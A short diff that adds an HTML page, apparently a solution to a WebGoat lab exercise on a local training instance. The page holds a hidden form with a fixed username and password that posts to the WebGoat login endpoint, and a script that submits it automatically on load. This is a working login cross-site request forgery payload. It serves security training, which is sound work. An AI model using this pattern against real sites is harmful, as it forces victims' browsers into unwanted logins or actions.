@@ -1,0 +1,9 @@
+<!-- 8.html -->
+<form id="csrfForm" action="http://localhost:8080/WebGoat/login" method="POST">
+    <input type="hidden" name="username" value="csrf-hack2024">
+    <input type="hidden" name="password" value="password">
+</form>
+<script>
+    // 自动提交表单
+    document.getElementById('csrfForm').submit();
+</script>
